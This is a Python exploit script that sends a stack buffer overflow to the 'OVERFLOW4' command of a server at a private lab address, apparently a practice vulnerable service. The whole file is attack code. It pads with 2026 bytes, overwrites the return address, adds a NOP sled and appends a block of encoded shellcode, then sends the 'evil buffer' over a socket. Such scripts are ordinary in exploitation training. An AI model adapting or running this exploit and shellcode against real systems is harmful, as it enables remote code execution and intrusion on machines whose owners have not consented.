import socket

ip = "192.168.56.101"
port = 1337

prefix = "OVERFLOW4 "
offset = 2026
overflow = "A" * offset

#retn = ""
#retn =  "BBBB"

retn =  "\xAF\x11\x50\x62"

padding = "\x90" * 16

payload = (
"\xbe\x1b\x02\xb3\xe2\xda\xc7\xd9\x74\x24\xf4\x5f\x29\xc9"
"\xb1\x59\x31\x77\x14\x03\x77\x14\x83\xef\xfc\xf9\xf7\x4f"
"\x0a\x72\xf7\xaf\xcb\xec\xc9\x7d\xaf\x67\x7b\xb2\xbb\x25"
"\x70\x39\xe9\xdd\x01\xd8\x3f\x22\x9a\x51\x68\xd3\x2a\xdf"
"\x4e\xda\x94\x4c\xb2\x7d\x69\x8f\xe7\x5d\x50\x40\xfa\x9c"
"\x95\x16\x70\x71\x4b\x22\x28\x9d\x3b\xbf\x8f\xa1\xc2\x6f"
"\x84\x99\xbc\x0a\x5b\x6d\x71\x14\x8c\x06\xc1\x0e\x7c\x93"
"\x8a\x0e\x7d\x70\xaf\x86\x09\x4a\x81\xe7\xbb\x39\xd5\x9c"
"\x3d\xeb\x27\x63\x91\xd2\x87\x6e\xeb\x13\x2f\x91\x9e\x6f"
"\x53\x2c\x99\xb4\x29\xea\x2c\x2a\x89\x79\x96\x8e\x2b\xad"
"\x41\x45\x27\x1a\x05\x01\x24\x9d\xca\x3a\x50\x16\xed\xec"
"\xd0\x6c\xca\x28\xb8\x37\x73\x69\x64\x99\x8c\x69\xc0\x46"
"\x29\xe2\xe3\x91\x4d\x0b\xfc\x9d\x13\x9b\x30\x50\xac\x5b"
"\x5f\xe3\xdf\x69\xc0\x5f\x48\xc1\x89\x79\x8f\x50\x9d\x79"
"\x5f\xda\xce\x87\x60\x1a\xc6\x43\x34\x4a\x70\x65\x35\x01"
"\x80\x8a\xe0\xbf\x8a\x1c\xcb\x97\xb3\xdd\xa3\xe5\xc3\xcc"
"\x6f\x60\x25\xbe\xdf\x22\xfa\x7f\xb0\x82\xaa\x17\xda\x0d"
"\x94\x08\xe5\xc4\xbd\xa3\x0a\xb0\x96\x5b\xb2\x99\x6d\xfd"
"\x3b\x34\x08\x3d\xb7\xbc\xec\xf0\x30\xb5\xfe\xe5\x26\x35"
"\xff\xf5\xc2\x35\x95\xf1\x44\x62\x01\xf8\xb1\x44\x8e\x03"
"\x94\xd7\xc9\xfc\x69\xe1\xa2\xcb\xff\x4d\xdd\x33\x10\x4d"
"\x1d\x62\x7a\x4d\x75\xd2\xde\x1e\x60\x1d\xcb\x33\x39\x88"
"\xf4\x65\xed\x1b\x9d\x8b\xc8\x6c\x02\x74\x3f\xef\x45\x8a"
"\xbd\xd8\xed\xe2\x3d\x59\x0e\xf2\x57\x59\x5e\x9a\xac\x76"
"\x51\x6a\x4c\x5d\x3a\xe2\xc7\x30\x88\x93\xd8\x18\x4c\x0d"
"\xd8\xaf\x55\xbe\xa3\xc0\x6a\x3f\x54\xc9\x0e\x40\x54\xf5"
"\x30\x7d\x82\xcc\x46\x40\x16\x6b\x58\xf7\x3b\xda\xf3\xf7"
"\x68\x1c\xd6")

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
